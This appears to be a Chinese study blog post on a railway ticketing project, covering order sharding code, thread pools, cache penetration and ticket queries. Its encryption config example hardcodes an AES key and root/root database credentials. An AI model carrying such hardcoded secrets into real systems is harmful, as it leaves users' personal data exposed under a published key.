<h3 id="订单如何分库分表"><a href="#订单如何分库分表" class="headerlink" title="订单如何分库分表"></a><strong>订单如何分库分表</strong></h3><p>订单分片键选择</p>
<p>业务基本诉求:</p>
<p>订单分库分表的基本查询条件是用户要能查看自己的订单，另外，也要支持订单号精准查询。这样的话，我们就需要按照两个字段当做分片键，这也就意味着每次查询时需要带着用户和订单两个字段，非常的不方便。能不能通过一个字段分库分表，但是查询时两个字段任意传一个就能精准查询，而不导致读扩散问题？</p>
<p>使用的方法：</p>
<ol>
<li>基因法</li>
</ol>
<p>这就需要用到咱们项目中使用的基因算法。那什么是分库分表基因算法？</p>
<p>说的通俗易懂点，就是我们通过把用户的后六位数据冗余到订单号里。这样的话，我们就可以按照用户 ID 后六位进行分库分表，并且将分片键定义为用户 ID 和订单号，只要查询中携带这两个字段，我们就取用户 ID 后六位进行查找分片表的位置。</p>
<p>这样我们就可以很好支持分库分表需求了，同时能满足用户和订单号两种查询逻辑，这也是大家热衷于使用基因算法的原因。</p>
<ol start="2">
<li>订单号生成</li>
</ol>
<p>为了保证订单号生成递增，我们参考雪花算法自定义了一个 <code>DistributedIdGenerator</code>，生成后的分布式 ID 再拼接上用户的后六位。</p>
<p><a href="https://blog.csdn.net/Alian_1223/article/details/134892390">Sharding-JDBC之ComplexKeysShardingAlgorithm（复合分片算法）-CSDN博客</a></p>
<p>对应分库算法代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.opengoofy.index12306.biz.orderservice.dao.algorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.collection.CollUtil;</span><br><span class="line"><span class="keyword">import</span> com.google.common.base.Preconditions;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.apache.shardingsphere.sharding.api.sharding.complex.ComplexKeysShardingAlgorithm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shardingsphere.sharding.api.sharding.complex.ComplexKeysShardingValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 订单数据库复合分片算法配置</span></span><br><span class="line"><span class="comment"> * ComplexKeysShardingAlgorithm 是 ShardingSphere 预留出来的可扩展分片算法接口</span></span><br><span class="line"><span class="comment"> * 注意：不同版本的 ShardingSphere 可能包路径、类名或者方法名不一致</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @公众号：马丁玩编程，回复：加群，添加马哥微信（备注：12306）获取项目资料</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderCommonDataBaseComplexAlgorithm</span> <span class="keyword">implements</span> <span class="title class_">ComplexKeysShardingAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> Properties props;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分库数量，读取的配置中定义的分库数量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> shardingCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SHARDING_COUNT_KEY</span> <span class="operator">=</span> <span class="string">&quot;sharding-count&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;String&gt; <span class="title function_">doSharding</span><span class="params">(Collection availableTargetNames, ComplexKeysShardingValue shardingValue)</span> &#123;</span><br><span class="line">        Map&lt;String, Collection&lt;Comparable&lt;Long&gt;&gt;&gt; columnNameAndShardingValuesMap = shardingValue.getColumnNameAndShardingValuesMap();</span><br><span class="line">        Collection&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(availableTargetNames.size());</span><br><span class="line">        <span class="keyword">if</span> (CollUtil.isNotEmpty(columnNameAndShardingValuesMap)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> <span class="string">&quot;user_id&quot;</span>;</span><br><span class="line">            <span class="comment">// 首先判断 SQL 是否包含用户 ID，如果包含直接取用户 ID 后六位</span></span><br><span class="line">            Collection&lt;Comparable&lt;Long&gt;&gt; customerUserIdCollection = columnNameAndShardingValuesMap.get(userId);</span><br><span class="line">            <span class="keyword">if</span> (CollUtil.isNotEmpty(customerUserIdCollection)) &#123;</span><br><span class="line">                <span class="comment">// 获取到 SQL 中包含的用户 ID 对应值</span></span><br><span class="line">                Comparable&lt;?&gt; comparable = customerUserIdCollection.stream().findFirst().get();</span><br><span class="line">                <span class="comment">// 如果使用 MybatisPlus 因为传入时没有强类型判断，所以有可能用户 ID 是字符串，也可能是 Long 等数值</span></span><br><span class="line">                <span class="comment">// 比如传入的用户 ID 可能是 1683025552364568576 也可能是 &#x27;1683025552364568576&#x27;</span></span><br><span class="line">                <span class="comment">// 根据不同的值类型，做出不同的获取后六位判断。字符串直接截取后六位，Long 类型直接通过 % 运算获取后六位</span></span><br><span class="line">                <span class="keyword">if</span> (comparable <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">actualOrderSn</span> <span class="operator">=</span> comparable.toString();</span><br><span class="line">                    <span class="comment">// 获取真实数据库的方法其实还是通过 HASH_MOD 方式取模的，shardingCount 就是咱们配置中的分库数量</span></span><br><span class="line">                    result.add(<span class="string">&quot;ds_&quot;</span> + hashShardingValue(actualOrderSn.substring(Math.max(actualOrderSn.length() - <span class="number">6</span>, <span class="number">0</span>))) % shardingCount);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">dbSuffix</span> <span class="operator">=</span> String.valueOf(hashShardingValue((Long) comparable % <span class="number">1000000</span>) % shardingCount);</span><br><span class="line">                    result.add(<span class="string">&quot;ds_&quot;</span> + dbSuffix);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果对订单中的 SQL 语句不包含用户 ID 那么就要从订单号中获取后六位，也就是用户 ID 后六位</span></span><br><span class="line">                <span class="comment">// 流程同用户 ID 获取流程</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">orderSn</span> <span class="operator">=</span> <span class="string">&quot;order_sn&quot;</span>;</span><br><span class="line">                Collection&lt;Comparable&lt;Long&gt;&gt; orderSnCollection = columnNameAndShardingValuesMap.get(orderSn);</span><br><span class="line">                Comparable&lt;?&gt; comparable = orderSnCollection.stream().findFirst().get();</span><br><span class="line">                <span class="keyword">if</span> (comparable <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">actualOrderSn</span> <span class="operator">=</span> comparable.toString();</span><br><span class="line">                    result.add(<span class="string">&quot;ds_&quot;</span> + hashShardingValue(actualOrderSn.substring(Math.max(actualOrderSn.length() - <span class="number">6</span>, <span class="number">0</span>))) % shardingCount);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(<span class="string">&quot;ds_&quot;</span> + hashShardingValue((Long) comparable % <span class="number">1000000</span>) % shardingCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回的是表名，</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Properties props)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.props = props;</span><br><span class="line">        shardingCount = getShardingCount(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getShardingCount</span><span class="params">(<span class="keyword">final</span> Properties props)</span> &#123;</span><br><span class="line">        Preconditions.checkArgument(props.containsKey(SHARDING_COUNT_KEY), <span class="string">&quot;Sharding count cannot be null.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(props.getProperty(SHARDING_COUNT_KEY));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">hashShardingValue</span><span class="params">(<span class="keyword">final</span> Comparable&lt;?&gt; shardingValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.abs((<span class="type">long</span>) shardingValue.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应分表算法代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderCommonTableComplexAlgorithm</span> <span class="keyword">implements</span> <span class="title class_">ComplexKeysShardingAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> Properties props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> shardingCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SHARDING_COUNT_KEY</span> <span class="operator">=</span> <span class="string">&quot;sharding-count&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;String&gt; <span class="title function_">doSharding</span><span class="params">(Collection availableTargetNames, ComplexKeysShardingValue shardingValue)</span> &#123;</span><br><span class="line">        Map&lt;String, Collection&lt;Comparable&lt;?&gt;&gt;&gt; columnNameAndShardingValuesMap = shardingValue.getColumnNameAndShardingValuesMap();</span><br><span class="line">        Collection&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(availableTargetNames.size());</span><br><span class="line">        <span class="keyword">if</span> (CollUtil.isNotEmpty(columnNameAndShardingValuesMap)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> <span class="string">&quot;user_id&quot;</span>;</span><br><span class="line">            Collection&lt;Comparable&lt;?&gt;&gt; customerUserIdCollection = columnNameAndShardingValuesMap.get(userId);</span><br><span class="line">            <span class="keyword">if</span> (CollUtil.isNotEmpty(customerUserIdCollection)) &#123;</span><br><span class="line">                Comparable&lt;?&gt; comparable = customerUserIdCollection.stream().findFirst().get();</span><br><span class="line">                <span class="keyword">if</span> (comparable <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">actualUserId</span> <span class="operator">=</span> comparable.toString();</span><br><span class="line">                    result.add(shardingValue.getLogicTableName() + <span class="string">&quot;_&quot;</span> + hashShardingValue(actualUserId.substring(Math.max(actualUserId.length() - <span class="number">6</span>, <span class="number">0</span>))) % shardingCount);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">dbSuffix</span> <span class="operator">=</span> String.valueOf(hashShardingValue((Long) comparable % <span class="number">1000000</span>) % shardingCount);</span><br><span class="line">                    result.add(shardingValue.getLogicTableName() + <span class="string">&quot;_&quot;</span> + dbSuffix);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">orderSn</span> <span class="operator">=</span> <span class="string">&quot;order_sn&quot;</span>;</span><br><span class="line">                Collection&lt;Comparable&lt;?&gt;&gt; orderSnCollection = columnNameAndShardingValuesMap.get(orderSn);</span><br><span class="line">                Comparable&lt;?&gt; comparable = orderSnCollection.stream().findFirst().get();</span><br><span class="line">                <span class="keyword">if</span> (comparable <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">actualOrderSn</span> <span class="operator">=</span> comparable.toString();</span><br><span class="line">                    result.add(shardingValue.getLogicTableName() + <span class="string">&quot;_&quot;</span> + hashShardingValue(actualOrderSn.substring(Math.max(actualOrderSn.length() - <span class="number">6</span>, <span class="number">0</span>))) % shardingCount);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">dbSuffix</span> <span class="operator">=</span> String.valueOf(hashShardingValue((Long) comparable % <span class="number">1000000</span>) % shardingCount);</span><br><span class="line">                    result.add(shardingValue.getLogicTableName() + <span class="string">&quot;_&quot;</span> + dbSuffix);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Properties props)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.props = props;</span><br><span class="line">        shardingCount = getShardingCount(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getShardingCount</span><span class="params">(<span class="keyword">final</span> Properties props)</span> &#123;</span><br><span class="line">        Preconditions.checkArgument(props.containsKey(SHARDING_COUNT_KEY), <span class="string">&quot;Sharding count cannot be null.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(props.getProperty(SHARDING_COUNT_KEY));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">hashShardingValue</span><span class="params">(<span class="keyword">final</span> Comparable&lt;?&gt; shardingValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.abs((<span class="type">long</span>) shardingValue.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="零七八碎"><a href="#零七八碎" class="headerlink" title="零七八碎"></a>零七八碎</h2><h3 id="线程池学习"><a href="#线程池学习" class="headerlink" title="线程池学习"></a>线程池学习</h3><p>七个参数、为什么不能使用Executors创建线程池、四个拒绝策略、线程池源码、快速消费线程池（<strong>如果当前线程大于核心线程数，不将任务放入阻塞队列，而是创建非核心线程执行任务</strong>。）</p>
<p><a href="https://www.yuque.com/magestack/12306/nxmcvkb3lnsqyxg4">参考Dubbo线程池模型实现快速消费线程池</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">这个方法是一个位运算方法，用于计算并返回一个整数值，通过将两个参数 rs 和 wc 进行按位“或”操作（|）。</span><br><span class="line">参数 rs：通常表示线程池的运行状态 (Run State)。</span><br><span class="line">参数 wc：通常表示工作线程的计数 (Worker Count)。</span><br><span class="line">按位或操作的结果会将 rs 和 wc 合并成一个整数（ctl值），以便在一个整数中同时表示线程池的状态和线程数。</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">ctlOf</span><span class="params">(<span class="type">int</span> rs, <span class="type">int</span> wc)</span> &#123; <span class="keyword">return</span> rs | wc; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctl 是一个 AtomicInteger 类型的变量，初始化时使用了 ctlOf(RUNNING, <span class="number">0</span>) 的返回值。这个值是线程池的初始控制状态，RUNNING 通常表示线程池的运行状态，<span class="number">0</span> 表示工作线程的初始数量为 <span class="number">0</span>。</span><br><span class="line">AtomicInteger：它是一个线程安全的整数包装类，能够保证在多线程环境中进行原子操作。</span><br><span class="line">作用：ctl 将被用作线程池的核心控制变量，来跟踪线程池的当前状态和工作线程数量。</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicInteger</span> <span class="variable">ctl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(ctlOf(RUNNING, <span class="number">0</span>))</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">workerCountOf</span><span class="params">(<span class="type">int</span> c)</span>  &#123; <span class="keyword">return</span> c &amp; COUNT_MASK; &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RUNNING</span>    <span class="operator">=</span> -<span class="number">1</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> ctl.get();</span><br><span class="line">    <span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addWorker(command, <span class="literal">true</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        c = ctl.get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">recheck</span> <span class="operator">=</span> ctl.get();</span><br><span class="line">        <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">            reject(command);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)<span class="comment">//如果当前没有任何活跃的工作线程 (workerCountOf(recheck) == 0)，则启动一个新的线程 (addWorker(null, false)) 来保证线程池的活跃性。这种情况通常表示线程池空闲，但有未处理的任务。</span></span><br><span class="line">            addWorker(<span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="literal">false</span>))</span><br><span class="line">        reject(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TTL学习"><a href="#TTL学习" class="headerlink" title="TTL学习"></a>TTL学习</h3><p><a href="https://github.com/alibaba/transmittable-thread-local">alibaba&#x2F;transmittable-thread-local: 📌 a missing Java std lib(simple &amp; 0-dependency) for framework&#x2F;middleware, provide an enhanced InheritableThreadLocal that transmits values between threads even using thread pooling components.</a></p>
<h3 id="快速消费线程池实现"><a href="#快速消费线程池实现" class="headerlink" title="快速消费线程池实现"></a>快速消费线程池实现</h3><p><a href="https://www.yuque.com/magestack/12306/nxmcvkb3lnsqyxg4">参考Dubbo线程池模型实现快速消费线程池</a></p>
<p><a href="https://blog.csdn.net/zzzgd_666/article/details/103009910">关于使用线程池，main方法跑完后程序仍在运行_threadpooltaskexecutor执行了一次为什么还不结束-CSDN博客</a></p>
<h2 id="12306面试："><a href="#12306面试：" class="headerlink" title="12306面试："></a>12306面试：</h2><h3 id="判断用户名是否已被注册接口，如何应对海量并发请求带来的缓存穿透问题？"><a href="#判断用户名是否已被注册接口，如何应对海量并发请求带来的缓存穿透问题？" class="headerlink" title="判断用户名是否已被注册接口，如何应对海量并发请求带来的缓存穿透问题？"></a>判断用户名是否已被注册接口，如何应对海量并发请求带来的缓存穿透问题？</h3><p><a href="https://www.yuque.com/magestack/12306/go6vg8whk9g1lyhp">手摸手之注册用户如何防止缓存穿透？</a></p>
<p>keyword：布隆过滤器 + Redis set </p>
<p>流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 用户名 &quot;mading&quot; 成功注册后，将其添加至布隆过滤器。</span><br><span class="line">2. 当其他用户查询&quot;mading&quot;是否已被使用时，首先检查布隆过滤器是否包含该用户名。</span><br><span class="line">3. 如果布隆过滤器中不存在该用户名，根据布隆过滤器的特点，可以确认该用户名一定没有被使用过，因此返回成功，证明该用户名可用。</span><br><span class="line">4. 如果布隆过滤器中存在该用户名，进一步检查Redis Set结构中是否包含该用户名。如果存在，表示该用户名已被注销，同样可被再次使用。</span><br><span class="line">5. 如果布隆过滤器中存在该用户名，但 Redis Set 结构中不存在，说明该用户名已被使用且尚未被注销，因此不可用。</span><br></pre></td></tr></table></figure>

<p>错误方法：</p>
<p>用户B也来注册magestack，先查缓存，发现有个key为magestack，value为null的，就默认它没有被注册，然后等注册该用户名后，将再更新缓存中key为magestack的value。</p>
<p>原因：这样想会导致之后60s内从缓存中查询到这个key的请求都得到当前用户未被使用的消息。就会造成之后在真正注册的时候，出现多个用户同时竞争这个用户名的情况，所以，在注册成功之前还得再检查一次数据库，看看这个用户名是不是先一步被别人注册了。这样会导致用户第一次查询用户名是否被使用的结果没多大意义，因为这个结果可能被多个人看见，然后一起竞争这个用户名，所以在实际注册成功前还得再查一下数据库，确认这个名字不存在才能注册。其次，如果在之后注册的时候，查询数据库，发现该用户名在数据库中已经存在了。就会出现第一次校验用户名的时候，显示用户名未被使用，实际注册的时候，却因为用户名已经被使用而注册失败。给用户带来极其差的体验。因此，这里缓存中的key应该默认为是已经被注册的名字。</p>
<h3 id="用户敏感数据存储到数据库后，如何避免被黑客将数据库攻破并窃取用户信息？"><a href="#用户敏感数据存储到数据库后，如何避免被黑客将数据库攻破并窃取用户信息？" class="headerlink" title="用户敏感数据存储到数据库后，如何避免被黑客将数据库攻破并窃取用户信息？"></a>用户敏感数据存储到数据库后，如何避免被黑客将数据库攻破并窃取用户信息？</h3><p>keyword：Apache ShardingSphere</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置数据源，底层被 ShardingSphere 进行了代理</span></span><br><span class="line"><span class="attr">dataSources:</span></span><br><span class="line">  <span class="attr">ds_0:</span></span><br><span class="line">    <span class="attr">dataSourceClassName:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">    <span class="attr">driverClassName:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">jdbcUrl:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/12306_user_0?useUnicode=true&amp;characterEncoding=UTF-8&amp;rewriteBatchedStatements=true&amp;allowMultiQueries=true&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="comment"># 数据加密存储规则</span></span><br><span class="line">  <span class="bullet">-</span> <span class="type">!ENCRYPT</span></span><br><span class="line">    <span class="comment"># 需要加密的表集合</span></span><br><span class="line">    <span class="attr">tables:</span></span><br><span class="line">      <span class="comment"># 用户表</span></span><br><span class="line">      <span class="attr">t_user:</span></span><br><span class="line">        <span class="comment"># 用户表中哪些字段需要进行加密</span></span><br><span class="line">        <span class="attr">columns:</span></span><br><span class="line">          <span class="comment"># 身份证字段，逻辑字段，不一定是在数据库中真实存在</span></span><br><span class="line">          <span class="attr">id_card:</span></span><br><span class="line">            <span class="comment"># 身份证字段存储的密文字段，这个是数据库中真实存在的字段</span></span><br><span class="line">            <span class="attr">cipherColumn:</span> <span class="string">id_card</span></span><br><span class="line">            <span class="comment"># 身份证字段加密算法</span></span><br><span class="line">            <span class="attr">encryptorName:</span> <span class="string">common_encryptor</span></span><br><span class="line">          <span class="attr">phone:</span></span><br><span class="line">            <span class="attr">cipherColumn:</span> <span class="string">phone</span></span><br><span class="line">            <span class="attr">encryptorName:</span> <span class="string">common_encryptor</span></span><br><span class="line">          <span class="attr">mail:</span></span><br><span class="line">            <span class="attr">cipherColumn:</span> <span class="string">mail</span></span><br><span class="line">            <span class="attr">encryptorName:</span> <span class="string">common_encryptor</span></span><br><span class="line">          <span class="attr">address:</span></span><br><span class="line">            <span class="attr">cipherColumn:</span> <span class="string">address</span></span><br><span class="line">            <span class="attr">encryptorName:</span> <span class="string">common_encryptor</span></span><br><span class="line">        <span class="comment"># 是否按照密文字段查询</span></span><br><span class="line">        <span class="attr">queryWithCipherColumn:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 加密算法</span></span><br><span class="line">    <span class="attr">encryptors:</span></span><br><span class="line">      <span class="comment"># 自定义加密算法名称</span></span><br><span class="line">      <span class="attr">common_encryptor:</span></span><br><span class="line">        <span class="comment"># 加密算法类型</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">AES</span></span><br><span class="line">        <span class="attr">props:</span></span><br><span class="line">          <span class="comment"># AES 加密密钥</span></span><br><span class="line">          <span class="attr">aes-key-value:</span> <span class="string">d6oadClrrb9A3GWo</span></span><br><span class="line"><span class="attr">props:</span></span><br><span class="line">  <span class="attr">sql-show:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="海量并发查询车票列表接口，如何应对海量请求的查询，以及众多条件如何满足？"><a href="#海量并发查询车票列表接口，如何应对海量请求的查询，以及众多条件如何满足？" class="headerlink" title="海量并发查询车票列表接口，如何应对海量请求的查询，以及众多条件如何满足？"></a>海量并发查询车票列表接口，如何应对海量请求的查询，以及众多条件如何满足？</h3><p><a href="https://www.yuque.com/magestack/12306/tygc8hs113al2c2z">手摸手之如何完成列车数据检索</a></p>
<p>请求的dto</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TicketPageQueryReqDTO</span> <span class="keyword">extends</span> <span class="title class_">PageRequest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 出发地 Code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String fromStation;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 目的地 Code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String toStation;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 出发日期</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date departureDate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 出发站点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String departure;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 到达站点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String arrival;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求例子：<a href="http://localhost:8080/api/ticket-service/ticket/query?fromStation=BJP&toStation=NJH&departureDate=2024-12-19">http://localhost:8080/api/ticket-service/ticket/query?fromStation=BJP&amp;toStation=NJH&amp;departureDate=2024-12-19</a></p>
<p><strong>先验证数据是否正确</strong> ： </p>
<p>责任链模式验证 1、空字符串 2、一些逻辑上的数据是否正确（比如出发日期、目的地等信息）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((emptyCount == <span class="number">2L</span> &amp;&amp; FLAG &amp;&amp; !distributedCache.hasKey(QUERY_ALL_REGION_LIST))</span><br><span class="line">	|| emptyCount == <span class="number">1L</span>) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClientException</span>(<span class="string">&quot;出发地或目的地不存在&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 如果FLAG=false代表有可能缓存没有数据，但数据库可能有，此时向下查询数据库</span></span><br><span class="line"> <span class="comment">// 为了避免缓存击穿，所以这里是用了分布式锁</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219143116855.png" alt="image-20241219143116855"></p>
<p><strong>加载城市数据</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219143502154.png" alt="image-20241219143502154"></p>
<p>该缓存也是永不过期</p>
<p><strong>查询列车站点信息</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219144253278.png" alt="image-20241219144253278"></p>
<p>列车详细信息中是没有列车余票数据的，因为这个数据是实时变更的，存入这里无法更新</p>
<p>查询出来的数据，开始对列车按照出发时间进行排序。</p>
<p>缓存不存在时的构造过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分布式双重判断</span><br><span class="line">LambdaQueryWrapper&lt;TrainStationRelationDO&gt; queryWrapper = Wrappers.lambdaQuery(TrainStationRelationDO.class)</span><br><span class="line">                            .eq(TrainStationRelationDO::getStartRegion, stationDetails.get(0))</span><br><span class="line">                            .eq(TrainStationRelationDO::getEndRegion, stationDetails.get(1));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219144956409.png" alt="image-20241219144956409"></p>
<p>然后遍历 trainStationRelationList ，进行对应得组装最后添加到result</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219145229664.png" alt="image-20241219145229664"></p>
<p><strong>查询列车余票信息</strong>（先查询一种类型票得信息，然后查询对应票得数量）</p>
<p>对应得缓存</p>
